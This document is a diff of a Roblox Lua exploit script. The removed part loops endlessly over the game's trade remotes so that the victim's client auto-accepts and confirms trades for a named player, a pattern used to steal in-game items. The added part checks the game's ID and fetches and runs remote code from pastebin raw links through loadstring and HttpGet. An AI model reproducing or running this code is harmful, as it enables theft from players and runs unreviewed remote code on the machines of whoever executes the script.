@@ -1,17 +1,12 @@
-print(1)
-local Loads = require(game.ReplicatedStorage.Fsys).load
-local RouterClient = Loads("RouterClient")
-local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-local TradeAcceptOnRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-local Service = game:GetService("TextChatService")
-Service.TextChannels.RBXGeneral:SendAsync("1")
+repeat task.wait() until game.GameId ~= nil
+repeat task.wait() until game:IsLoaded()
 
-plr = game.Players[Username]
+universeid = game.GameId
 
-while task.wait() do
-    wait(0.1)
-    TradeAcceptOnRequest:InvokeServer(plr, true)
-    AcceptNegotiationRemote:FireServer()
-    AcceptTradeRemote:FireServer()
+if universeid == 383310974 then
+    loadstring(game:HttpGet("https://pastebin.com/raw/mhGuWBUi", true))()
+end
+
+if universeid == 66654135 then
+    loadstring(game:HttpGet("https://pastebin.com/raw/ftQbevJ1", true))()
 end
